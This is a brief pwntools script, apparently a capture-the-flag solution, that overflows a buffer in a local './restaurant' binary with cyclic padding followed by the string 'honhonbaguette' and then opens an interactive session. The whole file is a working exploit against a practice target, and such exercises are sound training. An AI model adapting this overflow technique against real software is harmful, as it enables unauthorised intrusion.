#!/bin/python3

from pwn import *

proc = process("./restaurant")

padding = cyclic(cyclic_find("iaaa"))
target = b"honhonbaguette"

payload = padding + target
proc.sendline(payload)
proc.interactive()
proc.close()
